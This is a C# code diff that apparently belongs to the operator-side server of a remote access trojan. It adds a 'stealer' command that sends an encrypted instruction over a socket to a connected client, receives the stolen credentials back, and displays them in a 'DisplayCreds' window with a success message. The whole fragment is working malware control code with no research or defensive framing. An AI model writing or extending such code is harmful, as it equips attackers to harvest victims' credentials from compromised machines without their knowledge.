@@ -266,6 +266,26 @@ namespace Server_side
                     }
                 case 5:
                     {
+                        placeholder = "stealer";
+                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
+                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
+                        NetworkLayer.Send(clientSocket, encryptedCommand);
+
+                        logging("Command sent|---|" + cmdComboBox.Text);
+
+                        // Receive response
+                        byte[] response = GetResultFile(false);
+                        logging("Response received|---|" + Encoding.UTF8.GetString(response));
+
+                        if (Encoding.UTF8.GetString(response).Contains("Decrypt failed!"))
+                        {
+                            break;
+                        }
+
+                        MessageBox.Show("Stealer executed successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                        DisplayCreds displayCreds = new DisplayCreds(Encoding.UTF8.GetString(response));
+                        displayCreds.Show();
                         break;
                     }
                 case 6:
